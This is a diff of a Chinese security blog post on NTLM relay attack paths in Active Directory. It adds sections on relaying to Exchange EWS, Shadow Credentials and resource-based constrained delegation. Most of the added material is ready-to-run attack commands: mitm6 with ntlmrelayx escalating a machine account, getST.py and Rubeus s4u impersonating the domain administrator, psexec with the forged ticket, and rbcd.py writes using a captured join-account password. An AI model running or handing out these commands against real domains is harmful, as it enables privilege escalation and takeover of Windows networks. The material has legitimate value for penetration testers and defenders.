@@ -6,22 +6,7 @@
         <meta name="robots" content="noodp" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
         <title>NTLM Relay - 柠檬k</title><meta name="Description" content="Personal Blog"><meta property="og:title" content="NTLM Relay" />
-<meta property="og:description" content="本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读以下世纪好文：
-The NTLM Authentication Protocol and Security Support Provider
-NTLM 篇 - windows protocol
-NTLM Relay - hackndo
-本篇主要围绕下图进行。来自
-https://www.thehacker.recipes/ad/movement/ntlm/relayNTLM relay.drawio.png
-&#34; https://www.thehacker.recipes/ad/movement/ntlm/relay 
-原理直接看国外老哥写的这篇文章NTLM RELAY。本文主要讲Relay的一些路径。
-触发NTLM认证。 SMB PetitPotam（MS-EFSR） https://github.com/topotam/PetitPotam
- MS-EFSR 是 Microsoft 的加密文件系统远程协议。它对远程存储并通过网络访问的加密数据执行维护和管理操作，并可作为 RPC 接口使用。该接口可通过 \pipe\efsrpc、\pipe\lsarpc、\pipe\samr、\pipe\lsass 和 \pipe\netlogon SMB 命名管道使用。
-MS-efs触发机器账户强制返回身份验证。默认走SMB协议。
- 如果机器开启lsarpc的匿名访问。即可在不知道账户密码的情况下触发强制身份认证。
-PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
- Microsoft 的 Print Spooler 是一项处理打印作业和其他与打印相关的各种任务的服务。控制域用户/计算机的攻击者可以通过特定的 RPC 调用触发运行它的目标的假脱机服务，并使其对攻击者选择的目标进行身份验证。此缺陷是“无法修复”，默认情况下在所有 Windows 环境中启用。
-强制身份验证通过 SMB 进行。
-上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。" />
+<meta property="og:description" content="本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读以下世纪好文： The NTLM Authentication Protocol and Security Support Provider" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://songzhiv.github.io/ntlm-relay/" /><meta property="og:image" content="https://songzhiv.github.io/static/favicon.ico"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-02-18T17:10:15+08:00" />
@@ -31,22 +16,7 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
 <meta name="twitter:image" content="https://songzhiv.github.io/static/favicon.ico"/>
 
 <meta name="twitter:title" content="NTLM Relay"/>
-<meta name="twitter:description" content="本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读以下世纪好文：
-The NTLM Authentication Protocol and Security Support Provider
-NTLM 篇 - windows protocol
-NTLM Relay - hackndo
-本篇主要围绕下图进行。来自
-https://www.thehacker.recipes/ad/movement/ntlm/relayNTLM relay.drawio.png
-&#34; https://www.thehacker.recipes/ad/movement/ntlm/relay 
-原理直接看国外老哥写的这篇文章NTLM RELAY。本文主要讲Relay的一些路径。
-触发NTLM认证。 SMB PetitPotam（MS-EFSR） https://github.com/topotam/PetitPotam
- MS-EFSR 是 Microsoft 的加密文件系统远程协议。它对远程存储并通过网络访问的加密数据执行维护和管理操作，并可作为 RPC 接口使用。该接口可通过 \pipe\efsrpc、\pipe\lsarpc、\pipe\samr、\pipe\lsass 和 \pipe\netlogon SMB 命名管道使用。
-MS-efs触发机器账户强制返回身份验证。默认走SMB协议。
- 如果机器开启lsarpc的匿名访问。即可在不知道账户密码的情况下触发强制身份认证。
-PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
- Microsoft 的 Print Spooler 是一项处理打印作业和其他与打印相关的各种任务的服务。控制域用户/计算机的攻击者可以通过特定的 RPC 调用触发运行它的目标的假脱机服务，并使其对攻击者选择的目标进行身份验证。此缺陷是“无法修复”，默认情况下在所有 Windows 环境中启用。
-强制身份验证通过 SMB 进行。
-上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。"/>
+<meta name="twitter:description" content="本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读以下世纪好文： The NTLM Authentication Protocol and Security Support Provider"/>
 <meta name="application-name" content="柠檬k">
 <meta name="apple-mobile-web-app-title" content="柠檬k"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -63,7 +33,7 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/songzhiv.github.io\/ntlm-relay\/"
-        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  435 ,
+        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  3980 ,
         "url": "https:\/\/songzhiv.github.io\/ntlm-relay\/","datePublished": "2022-02-18T17:10:15+08:00","dateModified": "2022-02-21T21:11:59+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "nmk","logo": "https:\/\/songzhiv.github.io\/images\/avatar.png"},"author": {
@@ -140,8 +110,8 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
             <div class="toc-content always-active" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">NTLM Relay</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>nmk</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ad%E5%9F%9F/"><i class="far fa-folder fa-fw"></i>AD域</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-18">2022-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 435 字&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-18">2022-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3980 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
@@ -182,10 +152,30 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
         <li><a href="#cred-dump">Cred Dump</a></li>
         <li><a href="#exec">EXEC</a></li>
         <li><a href="#枚举信息">枚举信息</a></li>
-        <li><a href="#创建用户ldaps">创建用户（LDAPS）</a></li>
-        <li><a href="#exchange">Exchange</a></li>
-        <li><a href="#影子凭证shadow-credentials">影子凭证（Shadow Credentials）</a></li>
-        <li><a href="#rbcd低权限">RBCD（低权限）</a></li>
+        <li><a href="#创建用户ldaps">创建用户（LDAPS）</a>
+          <ul>
+            <li><a href="#添加机器账户">添加机器账户</a></li>
+            <li><a href="#添加普通用户">添加普通用户</a></li>
+          </ul>
+        </li>
+        <li><a href="#exchange">Exchange</a>
+          <ul>
+            <li><a href="#ldap-1">LDAP</a></li>
+            <li><a href="#ews">EWS</a></li>
+          </ul>
+        </li>
+        <li><a href="#影子凭证shadow-credentials">影子凭证（Shadow Credentials）</a>
+          <ul>
+            <li><a href="#隐蔽权限维持">隐蔽权限维持。</a></li>
+            <li><a href="#结合ntlm-relay">结合NTLM Relay</a></li>
+          </ul>
+        </li>
+        <li><a href="#rbcd低权限">RBCD（低权限）</a>
+          <ul>
+            <li><a href="#relay">Relay</a></li>
+            <li><a href="#加域账户">加域账户</a></li>
+          </ul>
+        </li>
       </ul>
     </li>
     <li><a href="#参考">参考</a></li>
@@ -206,7 +196,6 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
             alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/NTLM%20relay.drawio-20211202170757-i62539k.png" />
     </a><figcaption class="image-caption">https://www.thehacker.recipes/ad/movement/ntlm/relay</figcaption>
     </figure></p>
-<p>原理直接看国外老哥写的这篇文章<a href="https://en.hackndo.com/ntlm-relay/" target="_blank" rel="noopener noreffer">NTLM RELAY</a>。本文主要讲Relay的一些路径。</p>
 <h2 id="触发ntlm认证">触发NTLM认证。</h2>
 <h3 id="smb">SMB</h3>
 <h4 id="petitpotamms-efsr">PetitPotam（MS-EFSR）</h4>
@@ -216,14 +205,16 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
 <p>MS-efs触发机器账户强制返回身份验证。默认走SMB协议。</p>
 </blockquote>
 <p>如果机器开启lsarpc的匿名访问。即可在不知道账户密码的情况下触发强制身份认证。</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png"
-        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png 2x"
-        data-sizes="auto"
-        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png"
-        title="image.png" /></p>
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png" title="image.png" data-thumbnail="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png" data-sub-html="<h2>das</h2><p>image.png</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png"
+            data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png 2x"
+            data-sizes="auto"
+            alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png" />
+    </a><figcaption class="image-caption">das</figcaption>
+    </figure></p>
 <h4 id="printerbugms-rprn">PrinterBug（MS-RPRN）</h4>
 <p><a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py" target="_blank" rel="noopener noreffer">https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py</a></p>
 <blockquote>
@@ -330,6 +321,7 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
 <p><a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener noreffer">https://github.com/Kevin-Robertson/Inveigh</a></p>
 <p><a href="https://www.bettercap.org/installation/" target="_blank" rel="noopener noreffer">https://www.bettercap.org/installation/</a></p>
 <p><a href="https://github.com/dirkjanm/mitm6" target="_blank" rel="noopener noreffer">https://github.com/dirkjanm/mitm6</a></p>
+<p>这里我使用物理机演示。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -345,6 +337,26 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
         data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217205227-0dfqqn1.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217205227-0dfqqn1.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217205227-0dfqqn1.png 2x"
         data-sizes="auto"
         alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217205227-0dfqqn1.png"
+        title="image.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo python3 mitm6/mitm6.py  -d adc.com --interface eth0
+
+python3 ntlmrelayx.py -t ldap://10.10.10.10 -debug --remove-mic --delegate-access --escalate-user testpc<span class="se">\$</span> -wh wpad -6
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222210350-y9piovo.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222210350-y9piovo.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222210350-y9piovo.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222210350-y9piovo.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222210350-y9piovo.png"
         title="image.png" /></p>
 <h4 id="邮件钓鱼">邮件钓鱼</h4>
 <p>outlook与foxmail 图片预览功能支持HTTP和UNC路径，可触发SMB和http类型认证。</p>
@@ -520,9 +532,7 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
         alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219231301-lkb12xc.png"
         title="image.png" /></p>
 <h3 id="创建用户ldaps">创建用户（LDAPS）</h3>
-<ol>
-<li><strong>添加机器账户</strong>：</li>
-</ol>
+<h4 id="添加机器账户">添加机器账户</h4>
 <p>域有个属性<code>ms-DS-MachineAccountQuota</code> 他标志着非特权用户最多添加多少机器账户到域内。默认为10。</p>
 <p><img
         class="lazyload"
@@ -548,9 +558,7 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
         data-sizes="auto"
         alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234415-6pv0p08.png"
         title="image.png" /></p>
-<ol start="2">
-<li><strong>添加普通用户</strong></li>
-</ol>
+<h4 id="添加普通用户">添加普通用户</h4>
 <p>需要高权限账户（比如说域管）才可以，</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -569,6 +577,7 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
         alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234733-4hm6ef9.png"
         title="image.png" /></p>
 <h3 id="exchange">Exchange</h3>
+<h4 id="ldap-1">LDAP</h4>
 <p><strong>存在CVE-2019-1040漏洞的情况下，可以从SMB-&gt;LDAP(s)。而无需考虑签名的情况。</strong></p>
 <p>Exchange的机器账户是域内高权账户，对域有WriteDACL权限。即可以赋予任意用户两条ACE：</p>
 <ul>
@@ -637,10 +646,13 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
         data-sizes="auto"
         alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192403-wbh2ws4.png"
         title="image.png" /></p>
+<h4 id="ews">EWS</h4>
+<blockquote>
+<p>Exchange的认证也是支持NTLM SSP的。我们可以relay到Exchange，从而收发邮件，代理等等。在使用outlook的情况下还可以通过homepage或者下发规则达到命令执行的效果。而且这种Relay还有一种好处，将Exchange开放在外网的公司并不在少数，我们可以在外网发起relay，而不需要在内网，这是最刺激的。(<a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/6#2.-relay2ews" target="_blank" rel="noopener noreffer">Net- NTLM 利用 - windows protocol</a>)</p>
+</blockquote>
+<p><a href="https://github.com/Arno0x/NtlmRelayToEWS" target="_blank" rel="noopener noreffer">https://github.com/Arno0x/NtlmRelayToEWS</a></p>
 <h3 id="影子凭证shadow-credentials">影子凭证（Shadow Credentials）</h3>
-<ol>
-<li>隐蔽权限维持。</li>
-</ol>
+<h4 id="隐蔽权限维持">隐蔽权限维持。</h4>
 <blockquote>
 <p>常规Kerberos预认证阶段（pre-auth），客户端用自己的hash加密时间戳给KDC。KDC使用该用户的hash解密，验证通过后返回该用户的TGT。这是对称加密（DES、RC4、AES128、AES256）。Kerberos也支持非对称的认证方式，通过证书（PKINIT）或密钥对实现。需要安装ADCS。​</p>
 </blockquote>
@@ -720,22 +732,135 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
         data-sizes="auto"
         alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218150542-0wvho1i.png"
         title="image.png" /></p>
-<ol start="2">
-<li><strong>结合NTLM Relay</strong></li>
-</ol>
+<h4 id="结合ntlm-relay">结合NTLM Relay</h4>
 <p><a href="https://github.com/SecureAuthCorp/impacket/pull/1249" target="_blank" rel="noopener noreffer">https://github.com/SecureAuthCorp/impacket/pull/1249</a></p>
 <blockquote>
 <p>用户对象不能编辑自己的 msDS-KeyCredentialLink 属性，而机器账户可以。这意味着以下场景可以工作：从 DC01 触发 NTLM 身份验证，将其中继到 DC02，使 pywhisker 编辑 DC01 的属性以在其上创建 Kerberos PKINIT 预身份验证后门，并通过 PKINIT 和 pass-the-cache 持久访问 DC01。<br>
 计算机对象可以编辑它们自己的 msDS-KeyCredentialLink 属性，但只能在没有 KeyCredential 存在的情况下添加。</p>
 </blockquote>
 <h3 id="rbcd低权限">RBCD（低权限）</h3>
-<p>当一个用户给一台机器加域后，该用户就对该机器具有写属性权限（WriteProperty）。</p>
+<p>基于资源的约束性委派又名RBCD。</p>
+<p>配置约束性委派和非约束性委派都需要<code>SeEnableDelegation</code>权限。而这个权限一般只有域管才有。为了赋予用户更大的灵活性，微软在<code>Windows server 2012</code>中引进基于资源的约束性委派。</p>
+<blockquote>
+<p>基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。</p>
+</blockquote>
+<ul>
+<li>配置基于资源的约束性委派，无需<code>SeEnableDelegation</code>权限，<strong>只需要对机器具有写属性权限（WriteProperty）。即可配置。</strong></li>
+<li><code>msDS-AllowedToDelegateTo</code> 变成了 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>。但是方向相反。参照下图。</li>
+</ul>
+<p>也就是说，serviceB上配置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的值为serviceA。那么serviceB就信任来自serviceA的委派。也就是下图的<strong>传出信任</strong>与<strong>传入信任</strong>。</p>
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222144349-xcq29ok.png" title="image.png" data-thumbnail="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222144349-xcq29ok.png" data-sub-html="<h2>https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</h2><p>image.png</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222144349-xcq29ok.png"
+            data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222144349-xcq29ok.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222144349-xcq29ok.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222144349-xcq29ok.png 2x"
+            data-sizes="auto"
+            alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222144349-xcq29ok.png" />
+    </a><figcaption class="image-caption">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</figcaption>
+    </figure></p>
+<h4 id="relay">Relay</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">自动创建一个机器账户，密码随机。需要ldaps。
+python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --remove-mic --delegate-access  -smb2support
+指定机器账户
+python3 ntlmrelayx.py -t ldap://10.10.10.10 -debug --remove-mic --delegate-access --escalate-user testpc<span class="se">\$</span> 
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222170958-664dzj8.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222170958-664dzj8.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222170958-664dzj8.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222170958-664dzj8.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222170958-664dzj8.png"
+        title="image.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 getST.py -impersonate <span class="s1">&#39;administrator&#39;</span> -spn <span class="s1">&#39;cifs/WEB2.adc.com&#39;</span>  -dc-ip 10.10.10.10 <span class="s1">&#39;adc.com/USCJNQTK\$:&#39;</span>
+<span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
+python3 psexec.py -no-pass -k <span class="s1">&#39;adc.com/administrator@web2.adc.com&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222190456-prkusyk.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222190456-prkusyk.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222190456-prkusyk.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222190456-prkusyk.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222190456-prkusyk.png"
+        title="image.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">计算hash
+.<span class="se">\R</span>ubeus.exe <span class="nb">hash</span> /domain:adc.com /user:USCJNQTK$ /password:<span class="s2">&#34;iJ&#39;vp3V&gt;&#39;4De}tf&#34;</span>
+请求st
+.<span class="se">\R</span>ubeus.exe s4u /user:USCJNQTK$ /aes256:64033274241a7f086ce4254fc8a46072810c021013a546c807bad5421d33f7b6 /impersonateuser:Administrator /msdsspn:host/web2.adc.com /altservice:cifs /domain:adc.com /nowrap /ptt
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222193840-78dynwb.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222193840-78dynwb.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222193840-78dynwb.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222193840-78dynwb.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222193840-78dynwb.png"
+        title="image.png" /></p>
+<h4 id="加域账户">加域账户</h4>
+<blockquote>
+<p>当一个用户给一台机器加域后，该用户就对该机器具有写属性权限（WriteProperty）。而企业中往往都会有一个专门的加域用户，当我们拿到了这个加域用户的凭据后，我们就可以通过RBCD控制由该用户加入域内所有机器的权限。</p>
+</blockquote>
+<p>首先假设我们抓到了加域账户（<code>join</code>）的哈希或密码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 rbcd.py -delegate-to <span class="s1">&#39;web2&#39;</span> -action <span class="nb">read</span> <span class="s1">&#39;adc.com/join:song@2020&#39;</span> -dc-ip 10.10.10.10
+python3 rbcd.py -delegate-to <span class="s1">&#39;web2&#39;</span> -delegate-from USCJNQTK  -action write <span class="s1">&#39;adc.com/join:song@2020&#39;</span> -dc-ip 10.10.10.10
+python3 rbcd.py -delegate-to <span class="s1">&#39;web2&#39;</span> -action <span class="nb">read</span> <span class="s1">&#39;adc.com/join:song@2020&#39;</span> -dc-ip 10.10.10.10
+python3 getST.py -impersonate <span class="s1">&#39;administrator&#39;</span> -spn <span class="s1">&#39;cifs/WEB2.adc.com&#39;</span>  -dc-ip 10.10.10.10 <span class="s1">&#39;adc.com/USCJNQTK\$:&#39;</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220223105504-eczkohp.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220223105504-eczkohp.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220223105504-eczkohp.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220223105504-eczkohp.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220223105504-eczkohp.png"
+        title="image.png" /></p>
 <h2 id="参考">参考</h2>
 <p><a href="https://www.thehacker.recipes/ad/movement/ntlm/relay" target="_blank" rel="noopener noreffer">Relay - The Hacker Recipes</a></p>
 <p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian" target="_blank" rel="noopener noreffer">NTLM 篇 - windows protocol</a></p>
 <p><a href="https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&amp;mid=2247484864&amp;idx=1&amp;sn=94260cb4a4e643764f4cfd3565ae799b" target="_blank" rel="noopener noreffer">[域渗透] SQLSERVER 结合中继与委派</a></p>
 <p><a href="https://mp.weixin.qq.com/s/jtHJZUZpDVHa-P7NjwhhYQ" target="_blank" rel="noopener noreffer">安全研究 | 使用PetitPotam代替Printerbug</a></p>
+<p><a href="http://blog.nsfocus.net/combination-resource-constrained-delegation-ntlm-relaying-takes-privileges-host-system-domain/" target="_blank" rel="noopener noreffer">【M01N】资源约束委派和NTLM Relaying的组合拳接管域内任意主机系统权限 – 绿盟科技技术博客</a></p>
 <p><a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab" target="_blank" rel="noopener noreffer">Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members</a></p>
+<p><a href="https://pentestlab.blog/2021/10/20/lateral-movement-webclient/" target="_blank" rel="noopener noreffer">Lateral Movement – WebClient – Penetration Testing Lab</a></p>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
